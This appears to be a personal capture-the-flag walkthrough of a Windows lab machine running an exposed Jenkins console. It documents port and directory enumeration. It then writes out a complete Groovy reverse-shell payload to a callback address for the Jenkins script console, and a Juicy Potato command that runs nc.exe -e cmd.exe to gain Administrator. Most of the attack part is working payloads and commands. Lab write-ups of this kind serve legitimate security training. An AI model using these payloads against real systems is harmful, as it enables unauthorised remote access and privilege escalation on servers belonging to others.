# Enumeration
```python
rustscan -a 10.129.228.112 --ulimit 5000 -- -A -T4 -oA nmap_scan
```

```python
✘ 130 $ cat nmap_scan.nmap
# Nmap 7.99 scan initiated Fri Sep  4 18:03:52 2026 as: /usr/lib/nmap/nmap --privileged -vvv -p 80,135,50000 -4 -A -T4 -oA nmap_scan 10.129.228.112
Nmap scan report for 10.129.228.112
Host is up, received echo-reply ttl 127 (0.61s latency).
Scanned at 2026-09-04 18:03:53 IST for 41s

PORT      STATE SERVICE REASON          VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
50000/tcp open  http    syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)

```

## We see two web servers
- lets navigate to both of them :

port 80:
![[Pasted image 20260904180936.png]]
- the text field directs us to an error message which is a picture everytime no matter what we do. not worth looking into

port 50000:
![[Pasted image 20260904181003.png]]

## Directory enumeration with gobuster
```python
gobuster dir -u http://10.129.228.112:50000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 15 -o jetty.txt
```

- found an endpoint `/askjeeves` which is an exposed jenkins ports
![[Pasted image 20260904190209.png]]

- Then navigated to the script console and used a reverse shell payload to get access : 
![[Pasted image 20260904190310.png]]
```python
String host="10.10.17.210";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();

```

## Then used sliver to get a more stable shell refer to [[DarkHaven WT]] where we used sliver

# Initial access : 
![[Pasted image 20260904190612.png]]

- Got initial access as user `kohsuke`
- we can see that we have `seImpersonatePrivilege`
- We can use Juicy potato to gain access 
- Upload juicy potato and nc.exe to the victim machine using sliver (make sure nc and jp are the correct versions)
- [nc link](https://github.com/int0x33/nc.exe)
- [jp link](https://github.com/k4sth4/Juicy-Potato)

```python
nc -nvlp 8553
```

```python
execute jp.exe -- -t t -l 53375 -p C:/Windows/System32/cmd.exe -a "/c C:/Users/kohsuke/nc.exe 10.10.17.210 8553 -e cmd.exe"
```
![[Pasted image 20260904212934.png]]

- Got a shell as nt Administrator.
- Pwned!
## Using powersploit 
```python
git clone https://github.com/PowerShellMafia/PowerSploit.git
```
